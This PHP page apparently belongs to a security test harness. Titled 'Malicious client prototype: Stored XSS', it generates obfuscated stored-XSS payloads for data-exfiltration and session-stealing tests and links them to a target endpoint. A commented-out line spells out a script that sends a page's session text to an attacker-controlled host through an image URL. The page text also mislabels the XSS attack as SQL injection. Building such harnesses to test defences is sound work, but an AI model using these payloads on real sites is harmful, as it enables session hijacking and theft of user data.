<?php
include('../declare.php');
include(INCDIR.'payload.php');

$errors = array();
$attacks = array();

function PrepareScript($testname, $obfu, $subs) {
  if (is_array($subs)) {
    // Keys from the argument will overwrite those from the base array.
    $subs = array_merge(GetBaseSubs(), $subs);
  } else if ($subs) {
    // A truthy value indicates that the base array should be used.
    $subs = GetBaseSubs();
  }
  if (is_string($obfu)) {
    $code = GetObfuscatedPayload($testname, $obfu, $subs);
  } else {
    $code = GetPayload($testname, $subs);
  }
  return urlencode('<script>'.$code.'</script>');
}

function PrepareImage($src) {
  $src = str_replace('"', '\\"', $src);
  return urlencode('<img src="'.$src.'" />');
}

$adesc = 'exfil_test';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $exfilsub = array('TESTNAME' => $name);
  $attacks[$adesc][$name] = PrepareScript('exfil', $obfu, $exfilsub);
}

$adesc = 'session-steal';
$attacks[$adesc] = array();
foreach ($OBFUSCATIONS as $name => $obfu) {
  $attacks[$adesc][$name] = PrepareScript('sessionsteal', $obfu, true);
}


//$value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALROOT."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");

$title = "Malicious client prototype: Stored XSS";
include(INCDIR.'header.php');
?>
<h1>Stored XSS</h1>
<p class="instructions">
Clicking on the links below will simulate a malicious client making an SQL injection request.
</p>
<?
if (sizeof($errors) > 0) {
?>
<p id="errors"><?=implode('<br/>', $errors)?></p>
<?
}

// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $hname = htmlspecialchars($aname);
?>
<h3 id="<?=$hname?>" ><?=$hname?></h3>
<?
  if (isset($attack['#comment'])) {
?>
<p class="comment"><?=htmlspecialchars($attack['#comment'])?></p>
<?
  }
  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
?>
| <a href="<?=TGTROOT?>stored/target?value=<?=$pl?>"><?=htmlspecialchars($ob)?></a>
<?
  }
}

$links = array(
  'stored XSS start' => TGTROOT."stored/start",
);
include(INCDIR.'inc/footer.php');
?>
